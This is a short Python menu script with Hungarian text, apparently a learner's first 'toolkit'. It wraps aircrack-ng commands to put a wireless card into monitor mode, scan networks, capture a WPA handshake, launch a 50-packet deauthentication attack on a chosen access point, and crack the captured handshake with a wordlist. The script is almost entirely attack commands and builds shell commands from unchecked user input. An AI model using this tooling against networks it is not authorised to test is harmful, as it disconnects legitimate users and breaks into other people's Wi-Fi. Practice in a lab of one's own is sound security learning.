import os

def menu():
        print("szia udvozollek az elso toolkitemben ez a toolkit le egyszerusiti az aircrack toolt me lusta vagyok allandoan ki irni ezeket a kodok es segiti a gyakorlasom")
        print("1) kapcsold be a mon mododt")
        print("2) szkenneld le a netwokokat")
        print("3) handshake")
        print("4) deauth tamadas")
        print("5) password kitalalas (nem eri meg ki probalni)")
        print("6) mon kikapcsolasa")
        print("7) kilepes")


while True:
        menu()
        val = input("valassz egy opciot:  ")
        if val == "1":
                os.system("sudo airmon-ng start wlan0")
        elif val == "2":
                os.system("sudo airodump-ng wlan0mon")
        elif val == "3":
                bssid =input("ird ki a BSSID:")
                c = input("melyik kanalis:")
                os.system(f"sudo airodump-ng -c {c} --bssid {bssid} -w capture wlan0mon")
        elif val == "4":
                bssid =input("ird ki a BSSID:")
                os.system(f"sudo aireplay-ng -0 50 -a {bssid} wlan0mon")
        elif val == "5":
                wlist = input("mi az utad a wordlistetig:")
                os.system(f"sudo aircrack-ng -w {wlist} capture-01.cap")
        elif val == "6":
                os.system("sudo airmon-ng stop wlan0mon")
        elif val == "7":
                print("kilepes...(fogalmam sincs hogy kell meg csinalni csak nyomd meg a crtl+c combinaciot az majd meg oldja")
        else:
                print("ilyen nincs")

